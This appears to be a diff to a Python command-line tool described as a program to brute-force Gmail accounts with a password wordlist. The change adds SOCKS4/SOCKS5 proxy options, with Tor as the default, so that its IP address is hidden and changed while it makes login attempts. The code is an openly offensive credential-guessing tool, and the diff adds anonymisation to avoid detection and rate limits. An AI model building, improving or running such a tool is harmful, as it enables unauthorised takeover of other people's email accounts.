@@ -8,6 +8,7 @@ import subprocess
 import time
 import sys
 from functools import wraps
+import ipaddress
 
 class Colors:
 
@@ -36,9 +37,15 @@ class Parser:
 		self.args = argparse.ArgumentParser(description="Program to bruteforce emails on gmail")
 		self.args.add_argument("--email", help="Email you choose to bruteforce", required=True)
 		self.args.add_argument("--file", help="Wordlist to pick and try to use to bruteforce", type=self.validate_file, required=True)
-		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy", action='store_true')
+
+		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy. Defaults to Tor proxy.", type=self.check_valid_ip)
+		self.args.add_argument("--port", help="The port number for the proxy. Defaults to 9050 for Tor.", type=self.validate_port)
+		self.args.add_argument("--default-proxy", help="Default proxy to tor.", action='store_true')
+		self.args.add_argument("--socks", help="Type of socket you want. [SOCKS4, SOCKS5] Recommended for SOCKS5", type=self.validate_socks)
+
 		self.args.add_argument("--save", help="If you want to save the passwords that were incorrect to a file.", action='store_true')
-		self.args.add_argument("--time", help="Specify a time to sleep in seconds. Defaults to 0.5 seconds. Not recommended to set a time if you are using a proxy.", type=self.validate_time)
+		self.args.add_argument("--time", help="Specify a time to sleep in seconds. Defaults to 0.5 seconds. Proxies can slow the time to log in.", type=self.validate_time)
+
 
 		self.args_parsed = self.args.parse_args()
 
@@ -51,18 +58,46 @@ class Parser:
 	def get_time(self):
 		return self.args_parsed.time
 
+	def get_proxy(self):
+		return self.args_parsed.proxy
+
+	def get_port(self):
+		return self.args_parsed.port
+
+	def get_socks(self):
+		return self.args_parsed.socks
+
 	def validate_file(self, file):
 		if not os.path.exists(file) or not file.lower().endswith(".txt"):
-			print(Colors.red_color(f"[-] Invalid file: {file}"))
-			exit()
+			self.error_message(f"[-] Invalid file: {file}")
 		return file
 
 	def validate_time(self, time):
 		time = float(time)
 		if not isinstance(time, float):
-			print(Colors.red_color(f"[-] Invalid time: {str(time)}"))
-			exit()
+			self.error_message(f"[-] Invalid time: {str(time)}")
 		return time
+
+	def validate_port(self, port):
+		port = int(port)
+		if port > 65535 or port < 1024:
+			self.error_message(f"[-] Invalid port: {str(port)}")
+		return port 
+
+	def validate_socks(self, socks):
+		socks_list = ["SOCKS4", "SOCKS5"]
+		if socks not in socks_list:
+			self.error_message(f"Invalid option: {str(socks)}")
+		return socks
+
+	def check_valid_ip(self, ip):
+		if not ipaddress.ip_address(ip):
+			self.error_message("\n[-] Invalid proxy IP. please try again.")
+		return ip
+
+	def error_message(self, error):
+		print(Colors.red_color(error))
+		exit()
 
 def check_tor_running():
 	try:
@@ -148,21 +183,49 @@ class Email:
 					f.write("\n")
 					f.close()
 
-class Proxy:
+class Proxy(Parser):
 	def __init__(self):
-		self.current_ip = requests.get("http://icanhazip.com")
+		super().__init__()
+		self.port = self.get_port()
+		self.proxy_ip = self.get_proxy()
+		self.socket_type = self.get_socks()
+
+	def requests_ip_check(self):
+		try:
+			return requests.get("http://icanhazip.com")
+		except Exception:
+			print("[-] Error. Invalid options.")
+			exit()
 
 	def change_ip(self):
-		get_ip = f"[-] Your current IP is {self.current_ip.content.decode()}"
+		current_ip = self.requests_ip_check()
+		get_ip = f"[-] Your current IP is {current_ip.content.decode()}"
 		print(Colors.red_color(get_ip))
 		print("\n")
 
-		socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-		socket.socket = socks.socksocket
+		if self.proxy_ip and self.port:
+			self.socket_connection(self.socket_type, self.proxy_ip, self.port)
+		else:
+			self.socket_connection("SOCKS5", "127.0.0.1", 9050)
 
-		fresh_ip = requests.get("http://icanhazip.com")
+		fresh_ip = self.requests_ip_check()
 		new_ip = f"[+] New IP --> {fresh_ip.content.decode()}"
 		print(Colors.bright_blue(new_ip))
+
+	def socket_connection(self, socket_type, ip, port):
+		type_of_socket = socket_type
+
+		if type_of_socket == "SOCKS4":
+			socks.set_default_proxy(socks.SOCKS4, ip, port)
+			socket.socket = socks.socksocket
+
+		elif type_of_socket == "SOCKS5":
+			socks.set_default_proxy(socks.SOCKS5, ip, port)
+			socket.socket = socks.socksocket
+
+		else:
+			print("\n[-] Invalid socket.")
+			exit()
 
 
 
@@ -195,10 +258,9 @@ class BruteForce(Parser):
 
 if __name__ == '__main__':
 	try:
-		check_tor_running()
 		arguments = sys.argv[1:]
 
-		if "--proxy" in arguments:
+		if "--proxy" in arguments and "--port" in arguments and "--socks" in arguments:
 			Proxy().change_ip()
 			BruteForce().email_login()
 		else:
